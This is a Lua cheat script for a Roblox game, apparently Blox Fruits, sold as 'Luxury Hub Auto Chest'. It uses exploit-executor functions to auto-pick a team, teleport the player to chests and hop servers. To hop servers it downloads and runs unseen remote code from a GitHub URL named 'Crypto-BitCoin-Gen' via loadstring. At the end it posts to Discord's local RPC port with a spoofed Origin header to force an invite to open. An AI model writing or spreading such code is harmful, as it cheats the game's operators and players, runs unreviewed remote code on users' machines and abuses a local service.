-- Configuration
local Team = "Pirates" -- Set your desired team ("Pirates" or "Marines")
local AutoChestEnabled = true
local HopServerEnabled = true

-- Create a message GUI
local GameLoadGui = Instance.new("Message", workspace)
GameLoadGui.Text = 'Luxury Hub Auto Chest Free Scripts'

-- Get player objects
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Function to automatically select a team
local function AutoSelectTeam(teamName)
    local ChooseTeamGui = LocalPlayer.PlayerGui.Main.ChooseTeam
    if ChooseTeamGui and ChooseTeamGui.Visible then
        local TeamFrame = ChooseTeamGui.Container[teamName].Frame.ViewportFrame
        if TeamFrame then
            for _, event in ipairs({ "MouseButton1Click", "MouseButton1Down", "Activated" }) do
                for _, connection in ipairs(getconnections(TeamFrame.TextButton[event])) do
                    connection.Function()
                end
            end
        end
    end
end

-- Ensure the correct team is selected
repeat
    task.wait()
    if not LocalPlayer.Team and LocalPlayer.PlayerGui.Main.ChooseTeam.Visible then
        pcall(function()
            if Team == "Pirates" or Team == "Marines" then
                AutoSelectTeam(Team)
            else
                AutoSelectTeam("Pirates") -- Default team
            end
        end)
    end
until LocalPlayer.Team and game:IsLoaded()

-- Function to teleport to a specified position
local function teleport(CFrame)
    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame
end

local function autoTeleport(Position)
    for _ = 1, 6 do
        teleport(Position)
        LocalPlayer.Character.Humanoid:ChangeState(14)
    end
end

local ServerFunc = loadstring(game:HttpGet("https://raw.githubusercontent.com/NightsTimeZ/Api/main/Crypto-BitCoin-Gen"))()

-- Enable auto chest collection
local function AutoChest()
    while task.wait() do
        pcall(function()
            local chestList = workspace:GetChildren()
            for _, v in ipairs(chestList) do
                if v.Name:match("Chest%d") then
                    while v.Parent and AutoChestEnabled do
                        task.wait()
                        autoTeleport(v.CFrame)
                    end
                end
            end
            if HopServerEnabled and AutoChestEnabled then
                ServerFunc:NormalTeleport()
            end
        end)
    end
end

-- Function to handle error prompt
local function HandleErrorPrompt(child)
    if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
        game:GetService("TeleportService"):Teleport(game.PlaceId)
    end
end

-- Listen for error prompts
game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(HandleErrorPrompt)

-- Start the AutoChest function in a separate thread
task.spawn(AutoChest)

-- Additional code for Discord RPC (if needed)
local http_request = http_request

if syn then
    http_request = syn.request
else
    http_request = request
end

http_request({
    Url = "http://127.0.0.1:6463/rpc?v=1",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json",
        ["Origin"] = "https://discord.com"
    },
    Body = game:GetService("HttpService"):JSONEncode(
        {
            cmd = "INVITE_BROWSER",
            args = { code = "luxuryhub" },
            nonce = game:GetService("HttpService"):GenerateGUID(false)
        }
    )
})
